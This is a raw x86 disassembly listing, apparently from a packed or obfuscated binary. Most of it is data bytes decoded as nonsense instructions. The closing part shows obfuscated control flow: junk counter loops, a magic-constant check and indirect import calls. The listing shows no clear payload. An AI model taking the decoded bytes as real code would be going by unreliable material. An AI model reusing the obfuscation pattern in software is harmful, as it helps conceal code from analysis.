  418a0f:	cmp    ebp,DWORD PTR [edx+0x34]
  418a12:	mov    BYTE PTR [ebp+0x74],dh
  418a15:	push   cs
  418a16:	add    al,0x9f
  418a18:	push   esp
  418a19:	pop    ss
  418a1a:	nop    DWORD PTR [ecx-0x295fe915]
  418a21:	das    
  418a22:	(bad)  
  418a23:	aad    0x59
  418a25:	dec    bx
  418a27:	sub    dh,BYTE PTR [edx+ecx*8]
  418a2a:	nop
  418a2b:	sbb    cl,BYTE PTR [eax]
  418a2d:	inc    esp
  418a2e:	xchg   esi,eax
  418a2f:	dec    esp
  418a30:	xor    DWORD PTR ds:0x998679b1,0x42d7ca21
  418a3a:	fiadd  DWORD PTR [ecx+0x2f]
  418a3d:	sbb    al,0x5
  418a3f:	inc    ecx
  418a40:	jae    0x4189d2
  418a42:	sbb    al,0x8
  418a44:	nop
  418a45:	in     eax,0x12
  418a47:	mov    ds:0x55907d24,eax
  418a4c:	push   ss
  418a4d:	lahf   
  418a4e:	pop    esi
  418a4f:	push   esi
  418a50:	and    eax,0x90462a74
  418a55:	xchg   DWORD PTR [esi+0x50],esi
  418a58:	je     0x418a89
  418a5a:	daa    
  418a5b:	mov    bl,0x8e
  418a5d:	xchg   ebp,eax
  418a5e:	inc    ebx
  418a5f:	inc    ebp
  418a60:	sbb    eax,0x4a98ed38
  418a65:	and    eax,0xa29862b8
  418a6a:	or     DWORD PTR [eax],ebx
  418a6c:	(bad)  
  418a6d:	into   
  418a6e:	sbb    al,0xb4
  418a70:	adc    DWORD PTR [eax+0x4451bfe6],edx
  418a76:	div    BYTE PTR [ebx-0x36]
  418a79:	jecxz  0x418a74
  418a7b:	adc    DWORD PTR [esi+0x4c],ebp
  418a7e:	xor    dh,0xb9
  418a81:	les    esi,FWORD PTR ds:0x8021611c
  418a87:	lea    ebx,ds:0xba5469b2
  418a8d:	in     eax,0x24
  418a8f:	jmp    0xbad12eaa
  418a94:	lods   eax,DWORD PTR ds:[esi]
  418a95:	cdq    
  418a96:	mov    al,ds:0x97fcb2a9
  418a9b:	daa    
  418a9c:	push   esp
  418a9d:	xchg   ebp,eax
  418a9e:	test   al,0xb
  418aa0:	add    ecx,edx
  418aa2:	iret   
  418aa3:	xor    bl,BYTE PTR [edi+0x3eaa7392]
  418aa9:	fwait
  418aaa:	aam    0x2a
  418aac:	mov    ecx,0xda1c9e9
  418ab1:	enter  0x98cf,0x31
  418ab5:	loop   0x418ad7
  418ab7:	sub    BYTE PTR [eax-0x88a9cee],dh
  418abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418abe:	or     eax,edx
  418ac0:	std    
  418ac1:	xlat   BYTE PTR ds:[ebx]
  418ac2:	or     edx,DWORD PTR [edx+0x72]
  418ac5:	outs   dx,BYTE PTR ds:[esi]
  418ac6:	stos   BYTE PTR es:[edi],al
  418ac7:	retf   
  418ac8:	cmp    ebp,ebx
  418aca:	fwait
  418acb:	fwait
  418acc:	mov    ds:0xb381c196,eax
  418ad1:	adc    BYTE PTR [esi],bl
  418ad3:	lahf   
  418ad4:	pop    es
  418ad5:	mov    dl,0x96
  418ad7:	push   0xffffffc8
  418ad9:	retf   
  418ada:	jno    0x418a6c
  418adc:	imul   ebx,esp,0x7e61586
  418ae2:	stos   BYTE PTR es:[edi],al
  418ae3:	inc    ebx
  418ae4:	shl    DWORD PTR [edx+esi*2],1
  418ae7:	add    al,0x72
  418ae9:	sar    al,1
  418aeb:	jo     0x418b56
  418aed:	adc    bh,dl
  418aef:	push   0x61
  418af1:	addr16 inc esi
  418af3:	cmp    cl,0x9e
  418af6:	xor    eax,0x38d6f129
  418afb:	(bad)  [eax]
  418afd:	call   ebp
  418aff:	inc    ecx
  418b00:	mov    eax,ds:0xd3d7cc95
  418b05:	jle    0x418b86
  418b07:	test   al,0xc3
  418b09:	push   esp
  418b0a:	iret   
  418b0b:	lahf   
  418b0c:	pop    ebx
  418b0d:	dec    ebp
  418b0e:	push   edi
  418b0f:	div    BYTE PTR [edi]
  418b11:	dec    esi
  418b12:	sbb    esp,edx
  418b14:	inc    edx
  418b15:	pop    edx
  418b16:	outs   dx,DWORD PTR ds:[esi]
  418b17:	mov    eax,0x5f9c8f00
  418b1c:	jbe    0x418b1d
  418b1e:	push   ss
  418b1f:	or     dh,BYTE PTR [edx+edi*2]
  418b22:	jns    0x418b2f
  418b24:	pop    ebp
  418b25:	scas   al,BYTE PTR es:[edi]
  418b26:	lds    esi,FWORD PTR [edx]
  418b28:	outs   dx,BYTE PTR ds:[esi]
  418b29:	push   ebp
  418b2a:	test   DWORD PTR [ebp+0x32],eax
  418b2d:	dec    esi
  418b2e:	inc    edi
  418b2f:	fiadd  WORD PTR [eax+0x3c]
  418b32:	inc    esp
  418b33:	mov    bh,0x59
  418b35:	(bad)  
  418b37:	inc    edx
  418b38:	sub    BYTE PTR [eax-0x1a5cdc1c],al
  418b3e:	sahf   
  418b3f:	retf   
  418b40:	loop   0x418b04
  418b42:	inc    edx
  418b43:	arpl   WORD PTR [ebx],cx
  418b45:	jp     0x418b38
  418b47:	adc    BYTE PTR [edi+0x4f],al
  418b4a:	inc    edi
  418b4b:	(bad)  
  418b4c:	cld    
  418b4d:	out    dx,eax
  418b4e:	nop
  418b4f:	adc    eax,0xc2457020
  418b54:	call   0x4f03:0xf6d6e236
  418b5b:	pop    ecx
  418b5c:	mul    bh
  418b5e:	imul   esi,ebx,0xd08eb98f
  418b64:	xor    cl,al
  418b66:	mov    ebp,0x8d5f807
  418b6b:	aam    0xee
  418b6d:	xchg   ebp,eax
  418b6e:	out    0x57,eax
  418b70:	int    0xe2
  418b72:	repnz add eax,0x53b14f40
  418b78:	scas   al,BYTE PTR es:[edi]
  418b79:	pop    edi
  418b7a:	cmp    eax,0x8192aa9e
  418b7f:	test   eax,0xb2b26a88
  418b84:	das    
  418b85:	repz repnz enter 0x4007,0x13
  418b8b:	fist   DWORD PTR [edx-0x7d]
  418b8e:	(bad)  
  418b8f:	cld    
  418b90:	add    bh,BYTE PTR [ebx+ebx*2-0x3e]
  418b94:	not    DWORD PTR [ebx+0x67]
  418b97:	push   esp
  418b98:	dec    esp
  418b99:	out    dx,eax
  418b9a:	test   eax,0xd149ba90
  418b9f:	inc    ebp
  418ba0:	out    dx,al
  418ba1:	cwde   
  418ba2:	pop    esp
  418ba3:	jmp    0x418b4a
  418ba5:	sub    DWORD PTR [eax],edx
  418ba7:	add    al,0xc3
  418ba9:	dec    esi
  418baa:	dec    ecx
  418bab:	(bad)  
  418bac:	pusha  
  418bad:	rol    DWORD PTR [esi-0x42],1
  418bb0:	inc    esp
  418bb1:	mov    edi,0x8e81e800
  418bb6:	pusha  
  418bb7:	outs   dx,DWORD PTR ds:[esi]
  418bb8:	inc    ebx
  418bb9:	cmp    esi,DWORD PTR [edx-0x1d]
  418bbc:	(bad)  
  418bbd:	jge    0x418bbc
  418bbf:	dec    esp
  418bc0:	iret   
  418bc1:	cld    
  418bc2:	push   edx
  418bc3:	jmp    FWORD PTR ds:0x36d3db97
  418bc9:	adc    esi,DWORD PTR [edi]
  418bcb:	out    dx,eax
  418bcc:	dec    esp
  418bcd:	lods   eax,DWORD PTR ds:[esi]
  418bce:	inc    edi
  418bcf:	lock pop esi
  418bd1:	clc    
  418bd2:	xchg   ebx,eax
  418bd3:	loope  0x418b97
  418bd5:	(bad)  
  418bd6:	push   ebx
  418bd7:	stos   DWORD PTR es:[edi],eax
  418bd8:	xchg   edi,eax
  418bd9:	lods   eax,DWORD PTR ds:[esi]
  418bda:	cmp    dh,BYTE PTR [edi-0x6595e84e]
  418be0:	popa   
  418be1:	sbb    eax,0x8973524c
  418be6:	pop    eax
  418be7:	(bad)  
  418be8:	adc    ch,al
  418bea:	mov    edx,DWORD PTR [ecx]
  418bec:	xor    esp,DWORD PTR [edx+0x5f]
  418bef:	imul   ebx,DWORD PTR [edi-0x47],0xbe649a2a
  418bf6:	mov    esi,0xcab169ae
  418bfb:	mov    dl,0xad
  418bfd:	jp     0x418c13
  418bff:	and    bh,0xe4
  418c02:	and    BYTE PTR [edi+0x4c],al
  418c05:	sbb    al,0x77
  418c07:	jo     0x418bf6
  418c09:	dec    ecx
  418c0a:	int    0x69
  418c0c:	add    BYTE PTR [edx+eiz*1],0x4a
  418c10:	adc    BYTE PTR [ebx+0x12222c07],ah
  418c16:	mov    ebp,0x9bf9d74a
  418c1b:	add    al,0x8c
  418c1d:	or     ah,BYTE PTR [edx+0x5a]
  418c20:	push   edi
  418c21:	sti    
  418c22:	jns    0x418bb8
  418c24:	loopne 0x418c71
  418c26:	jp     0x418c47
  418c28:	enter  0x32bc,0x41
  418c2c:	bound  eax,QWORD PTR [ebp+0x4b]
  418c2f:	lods   al,BYTE PTR ds:[esi]
  418c30:	pop    eax
  418c31:	jle    0x418c3a
  418c33:	jb     0x418c6f
  418c35:	mov    DWORD PTR [ebx-0x71],ecx
  418c38:	cs and al,0x58
  418c3b:	int    0x62
  418c3d:	dec    ebx
  418c3e:	rcr    DWORD PTR [edx+ebx*4+0x42],0x54
  418c43:	xchg   DWORD PTR [ebp-0x61],esp
  418c46:	sub    BYTE PTR [edx],al
  418c48:	jg     0x418bee
  418c4a:	pop    ecx
  418c4b:	and    ah,cl
  418c4d:	and    al,0x58
  418c4f:	and    bl,dl
  418c51:	enter  0x5a2f,0x66
  418c55:	mov    esi,0xcabc92eb
  418c5a:	(bad)  
  418c5b:	jmp    0x418bf2
  418c5d:	push   cs
  418c5e:	pop    eax
  418c5f:	add    ebp,DWORD PTR [edx-0x52dda78d]
  418c65:	aam    0xb8
  418c67:	cmp    dl,dh
  418c69:	add    cl,BYTE PTR [edi]
  418c6b:	les    ecx,FWORD PTR [edx]
  418c6d:	xlat   BYTE PTR ds:[ebx]
  418c6e:	icebp  
  418c6f:	xor    BYTE PTR [ecx+esi*2+0x7a87032b],cl
  418c76:	fwait
  418c77:	mov    al,0x3e
  418c79:	cwde   
  418c7a:	out    dx,al
  418c7b:	adc    cl,BYTE PTR [edx]
  418c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c7e:	pop    esi
  418c7f:	je     0x418c4c
  418c81:	sub    DWORD PTR [edi+0x5ec74704],0x29
  418c88:	mov    cs,WORD PTR [esi+0x67]
  418c8b:	mov    bl,0x76
  418c8d:	into   
  418c8e:	fnstsw WORD PTR [eax-0x20083a97]
  418c94:	test   BYTE PTR [eax-0x74],ch
  418c97:	pavgb  mm7,QWORD PTR [edi-0x1f0237ce]
  418c9e:	mov    ebp,0x6ac37135
  418ca3:	call   0x92c45579
  418ca8:	jns    0x418cdd
  418caa:	adc    eax,0x358634f2
  418caf:	hlt    
  418cb0:	or     bl,dh
  418cb2:	xor    DWORD PTR [esp+ecx*4-0x6de35279],eax
  418cb9:	xor    DWORD PTR [edi],eax
  418cbb:	xor    eax,0xb7840eb7
  418cc0:	je     0x418d21
  418cc2:	xlat   BYTE PTR ds:[ebx]
  418cc3:	out    0xf3,eax
  418cc5:	inc    esi
  418cc6:	ffree  st(2)
  418cc8:	mov    bh,0xf3
  418cca:	lds    esp,FWORD PTR [esp+ebp*2-0x49]
  418cce:	sbb    al,0x5f
  418cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd1:	jno    0x418ca8
  418cd3:	xchg   esi,ecx
  418cd5:	es mov ebp,0x42d93960
  418cdb:	push   0x39b255bf
  418ce0:	add    ch,bh
  418ce2:	or     ecx,esp
  418ce4:	rcr    DWORD PTR [edi+0x4a],1
  418ce7:	mov    al,ds:0x6c246a3a
  418cec:	mov    bl,dl
  418cee:	mov    ebx,0xd4d5fd42
  418cf3:	int    0x58
  418cf5:	shr    al,cl
  418cf7:	push   ss
  418cf8:	sub    ecx,esi
  418cfa:	push   ss
  418cfb:	cdq    
  418cfc:	xchg   esi,eax
  418cfd:	lods   al,BYTE PTR ds:[esi]
  418cfe:	js     0x418d25
  418d00:	cmp    eax,0xed73896b
  418d05:	jmp    0x913a443c
  418d0a:	and    al,0x9a
  418d0c:	jns    0x418cd5
  418d0e:	sub    BYTE PTR gs:[esi-0x1575df40],dh
  418d15:	xor    DWORD PTR [edi],0xffffffc3
  418d18:	aam    0x81
  418d1a:	ret    
  418d1b:	pop    ebx
  418d1c:	inc    ecx
  418d1d:	(bad)  
  418d1e:	xlat   BYTE PTR ds:[ebx]
  418d1f:	arpl   WORD PTR [ecx],cx
  418d21:	mov    al,0x94
  418d23:	call   0x8a676cec
  418d28:	(bad)  
  418d2a:	shr    DWORD PTR [edi],1
  418d2c:	ds add eax,0xcb405002
  418d32:	mov    esp,ebx
  418d34:	sar    edi,cl
  418d36:	mov    edi,0x76deb3a0
  418d3b:	jno    0x418ce7
  418d3d:	test   eax,0xad057878
  418d42:	xlat   BYTE PTR ds:[ebx]
  418d43:	imul   eax,DWORD PTR [esi+0x33],0x55
  418d47:	int    0xe2
  418d49:	test   ebx,edx
  418d4b:	into   
  418d4c:	jb     0x418d62
  418d4e:	test   al,0xe0
  418d50:	inc    edi
  418d51:	retf   0x1c3
  418d54:	shl    BYTE PTR es:[eax+0x1d9663f6],1
  418d5b:	mov    BYTE PTR [ebx-0x36],ah
  418d5e:	aad    0x55
  418d60:	xor    al,0x3b
  418d62:	inc    esp
  418d63:	adc    edi,DWORD PTR [edi+0x56]
  418d66:	and    DWORD PTR [esi-0x4a27418f],ecx
  418d6c:	nop
  418d6d:	sbb    eax,0xaf29be49
  418d72:	jmp    0x3fdbc88e
  418d77:	dec    eax
  418d78:	cmp    al,0xd7
  418d7a:	lods   eax,DWORD PTR ds:[esi]
  418d7b:	push   ecx
  418d7c:	test   DWORD PTR [esi],ebp
  418d7e:	mov    WORD PTR [edi+0x0],es
  418d81:	nop
  418d82:	ins    BYTE PTR es:[edi],dx
  418d83:	sub    BYTE PTR ds:0xc8919f3a,ch
  418d89:	stos   DWORD PTR es:[edi],eax
  418d8a:	gs mov cl,0xb8
  418d8d:	repnz inc eax
  418d8f:	pop    ebp
  418d90:	push   ds
  418d91:	jecxz  0x418de7
  418d93:	jp     0x418d32
  418d95:	cmp    DWORD PTR [ecx-0xa],ebp
  418d98:	test   DWORD PTR ds:0x36d438e4,edx
  418d9e:	loope  0x418d41
  418da0:	sub    BYTE PTR ds:0xb09b3881,dh
  418da6:	and    al,0x88
  418da8:	inc    edx
  418da9:	cmc    
  418daa:	cmp    DWORD PTR [eax-0x6c],esi
  418dad:	or     ch,dh
  418daf:	pop    ecx
  418db0:	add    al,0x15
  418db2:	or     BYTE PTR [ebx],cl
  418db4:	xchg   bx,ax
  418db6:	push   0xd848c434
  418dbb:	add    DWORD PTR [ecx],edx
  418dbd:	ror    BYTE PTR [eax],1
  418dbf:	out    dx,al
  418dc0:	dec    ecx
  418dc1:	pushf  
  418dc2:	or     BYTE PTR [ecx+0x68e6b6da],dh
  418dc8:	cmp    BYTE PTR [esp+eiz*2],0x36
  418dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dcd:	jg     0x418d88
  418dcf:	push   ds
  418dd0:	jns    0x418d71
  418dd2:	cli    
  418dd3:	sti    
  418dd4:	fimul  DWORD PTR [eax]
  418dd6:	aas    
  418dd7:	fadd   st(6),st
  418dd9:	mov    ebp,0xad8d8a62
  418dde:	inc    esp
  418ddf:	frstor [edi-0x1c3d464]
  418de5:	ret    
  418de6:	test   al,0x7
  418de8:	shr    DWORD PTR [eax+edx*1],1
  418deb:	inc    BYTE PTR [eax+0x13]
  418dee:	setg   BYTE PTR [edi+0x5d6c12ed]
  418df5:	mov    bh,0xd8
  418df7:	ror    DWORD PTR [edx-0x18],cl
  418dfa:	aas    
  418dfb:	mov    ch,0xb0
  418dfd:	sahf   
  418dfe:	out    dx,al
  418dff:	xchg   edx,eax
  418e00:	adc    dh,ch
  418e02:	push   ebx
  418e03:	jle    0x418e21
  418e05:	loop   0x418d8f
  418e07:	xor    DWORD PTR [ebx],0xffffffcf
  418e0a:	xor    eax,0x71e0abe4
  418e0f:	sbb    BYTE PTR [edx],bh
  418e11:	ret    
  418e12:	sub    bl,BYTE PTR [edi]
  418e14:	xor    al,0x89
  418e16:	lahf   
  418e17:	jb     0x418e95
  418e19:	inc    eax
  418e1a:	xchg   esp,eax
  418e1b:	push   0xa9298cd7
  418e20:	push   ecx
  418e21:	inc    edx
  418e22:	and    ah,dl
  418e24:	(bad)  
  418e26:	data16 aaa 
  418e28:	cmp    bl,ch
  418e2a:	mov    ds,WORD PTR [esi-0x67]
  418e2d:	ficom  DWORD PTR [ebx]
  418e2f:	rol    BYTE PTR [edx+0x5f],0xf1
  418e33:	out    dx,eax
  418e34:	and    BYTE PTR [ebp+0x55bd2244],0x8b
  418e3b:	mov    dh,BYTE PTR [eax-0x4ce7cbf0]
  418e41:	dec    esp
  418e42:	jbe    0x418ea7
  418e44:	outs   dx,BYTE PTR ds:[esi]
  418e45:	sahf   
  418e46:	call   0xd36b:0x4e82344c
  418e4d:	aam    0x7
  418e4f:	xor    ebx,DWORD PTR [ecx-0x39]
  418e52:	mov    dh,0x30
  418e54:	mov    ebp,0x4ec94261
  418e59:	xor    al,0x4b
  418e5b:	fiadd  DWORD PTR [eax+ebp*2-0xea3282f]
  418e62:	fild   QWORD PTR [ebx]
  418e64:	mov    DWORD PTR [ebx+eax*1-0x80],edi
  418e68:	mov    dl,0xed
  418e6a:	push   esp
  418e6b:	jae    0x418e1d
  418e6d:	in     al,dx
  418e6e:	lds    ebx,FWORD PTR [ebp+0xf]
  418e71:	aaa    
  418e72:	mov    dh,dh
  418e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e75:	fnstsw WORD PTR [esi-0x22]
  418e78:	inc    esp
  418e79:	lods   al,BYTE PTR ds:[esi]
  418e7a:	sbb    al,0xdf
  418e7c:	iret   
  418e7d:	das    
  418e7e:	jp     0x418e3c
  418e80:	push   es
  418e81:	(bad)  
  418e82:	mov    ebp,0xb2348711
  418e87:	ficom  WORD PTR [ebx]
  418e89:	mov    ds:0x31cb4c33,eax
  418e8f:	sbb    cl,BYTE PTR [edx+0x744b2f4f]
  418e95:	cld    
  418e96:	inc    esi
  418e97:	jb     0x418ec5
  418e99:	or     edx,edx
  418e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e9c:	in     al,dx
  418e9d:	addr16 adc eax,0x216a4f
  418ea3:	and    eax,0x4e7997b7
  418ea8:	mov    ds:0x4553b07b,al
  418ead:	adc    ebx,DWORD PTR [ebp+0x2b]
  418eb0:	lea    edi,[ecx-0x587b0d40]
  418eb6:	js     0x418ee3
  418eb8:	sub    bl,BYTE PTR gs:[eax]
  418ebb:	jecxz  0x418e66
  418ebd:	jb     0x418e48
  418ebf:	sti    
  418ec0:	aas    
  418ec1:	jmp    0xc369eccb
  418ec6:	daa    
  418ec7:	dec    ecx
  418ec8:	fcom   QWORD PTR [ebx-0x2d033824]
  418ece:	mov    esp,0x6b90c418
  418ed3:	ins    DWORD PTR es:[edi],dx
  418ed4:	push   esp
  418ed5:	loope  0x418f3e
  418ed7:	mov    esi,0x5f1e6e17
  418edc:	cmp    edx,esi
  418ede:	push   ebp
  418edf:	ret    0x28d
  418ee2:	sub    al,0x95
  418ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ee5:	inc    eax
  418ee6:	pop    DWORD PTR [edx]
  418ee8:	hlt    
  418ee9:	cmp    eax,0xf340b4f2
  418eee:	ss xchg esp,eax
  418ef0:	xchg   BYTE PTR [eax],dl
  418ef2:	fld    DWORD PTR [ebx+0x42fa0e6d]
  418ef8:	jb     0x418ef6
  418efa:	repz bound esp,QWORD PTR [esi]
  418efd:	cmp    ebx,esp
  418eff:	cmp    esi,ecx
  418f01:	rcr    DWORD PTR [esi-0x60],1
  418f04:	xor    eax,0xac9ce27
  418f09:	or     ebx,DWORD PTR ds:0x116adde
  418f0f:	(bad)  
  418f10:	mov    edi,ss
  418f12:	mov    edi,0x4b7e9f7b
  418f17:	sub    DWORD PTR [edi+0x731bb325],0xffffff89
  418f1e:	stos   DWORD PTR es:[edi],eax
  418f1f:	outs   dx,DWORD PTR ds:[esi]
  418f20:	adc    eax,0xf01e0d15
  418f25:	cmp    BYTE PTR [edx-0x45e81c97],dh
  418f2b:	or     eax,0xc1582123
  418f30:	xchg   edi,eax
  418f31:	js     0x418ec9
  418f33:	fwait
  418f34:	rol    esi,cl
  418f36:	push   0xa39784e3
  418f3b:	lods   al,BYTE PTR ds:[esi]
  418f3c:	outs   dx,DWORD PTR ds:[esi]
  418f3d:	je     0x418ef5
  418f3f:	jg     0x418ef4
  418f41:	pusha  
  418f42:	aas    
  418f43:	scas   eax,DWORD PTR es:[edi]
  418f44:	fcom   DWORD PTR [ebx]
  418f46:	dec    ebp
  418f47:	add    al,0xf3
  418f49:	mov    ebp,DWORD PTR [edx-0x70]
  418f4c:	mov    bl,0x62
  418f4e:	xor    eax,0x5386acc4
  418f53:	push   edi
  418f54:	loop   0x418f5e
  418f56:	dec    ebx
  418f57:	daa    
  418f58:	xchg   ebx,eax
  418f59:	xor    al,0x10
  418f5b:	xchg   ecx,eax
  418f5c:	dec    edx
  418f5d:	push   cs
  418f5e:	adc    eax,0x7abbfe37
  418f63:	jnp    0x418f48
  418f65:	fld    TBYTE PTR [edx]
  418f67:	cmp    esi,DWORD PTR [edx+edi*8-0x42d0d0f9]
  418f6e:	mov    ds:0xce4ee1fe,eax
  418f73:	or     BYTE PTR [eax],dl
  418f75:	push   0xffffff90
  418f77:	inc    esp
  418f78:	dec    ecx
  418f79:	gs int 0x0
  418f7c:	rcl    dh,1
  418f7e:	xchg   edi,eax
  418f7f:	fcmovbe st,st(1)
  418f81:	xor    edi,DWORD PTR [ebp-0xf]
  418f84:	jmp    0x9f240029
  418f89:	in     eax,0xc0
  418f8b:	push   0x1f8faa4
  418f90:	push   ss
  418f91:	sbb    DWORD PTR [ecx],0x3f
  418f94:	xor    al,0xc8
  418f96:	loopne 0x418f56
  418f98:	xchg   esp,eax
  418f99:	test   eax,0x5969c1bb
  418f9e:	pop    eax
  418f9f:	(bad)
  418fa3:	mov    bl,0x8e
  418fa5:	cmc    
  418fa6:	(bad)  
  418fa7:	pop    ss
  418fa8:	or     al,0xca
  418faa:	int    0xf
  418fac:	dec    ecx
  418fad:	scas   eax,DWORD PTR es:[edi]
  418fae:	out    dx,eax
  418faf:	xchg   ebp,eax
  418fb0:	push   edx
  418fb1:	je     0x418f78
  418fb3:	xor    BYTE PTR [esi],bl
  418fb5:	in     eax,dx
  418fb6:	sub    BYTE PTR [edi],0xc6
  418fb9:	je     0x419009
  418fbb:	or     al,BYTE PTR [esi-0xf6b2d7b]
  418fc1:	xchg   ecx,eax
  418fc2:	imul   ebp,DWORD PTR [edi-0x629cb8b9],0x1416bdf5
  418fcc:	mov    gs,ebp
  418fce:	xor    dh,BYTE PTR [edx]
  418fd0:	into   
  418fd1:	jmp    0x1213:0xb77cfd07
  418fd8:	jne    0x418fe2
  418fda:	outs   dx,BYTE PTR ds:[esi]
  418fdb:	fst    QWORD PTR [esi-0x4ec68498]
  418fe1:	pop    edi
  418fe2:	jno    0x41902c
  418fe4:	in     al,0xef
  418fe6:	sub    BYTE PTR [edi-0x56cbef36],ch
  418fec:	enter  0x9f67,0xea
  418ff0:	pop    ebp
  418ff1:	adc    DWORD PTR [ebx],0x3f45bb35
  418ff7:	xchg   edi,eax
  418ff8:	rcl    esi,1
  418ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ffc:	in     eax,dx
  418ffd:	popa   
  418ffe:	xor    edi,DWORD PTR [eax]
  419000:	mov    ebx,0xf78e80c0
  419005:	ins    DWORD PTR es:[edi],dx
  419006:	jb     0x41906f
  419008:	outs   dx,BYTE PTR ds:[esi]
  419009:	mov    edx,0xd915837f
  41900e:	cmp    DWORD PTR [esi-0x7600bd73],ecx
  419014:	adc    edx,DWORD PTR [esi+0x6bc9fe38]
  41901a:	dec    eax
  41901b:	mov    edx,0x3272db
  419020:	add    DWORD PTR ds:0x42a008,0x5e50
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423dca
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x4244de
  41918d:	push   0x4244a4
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
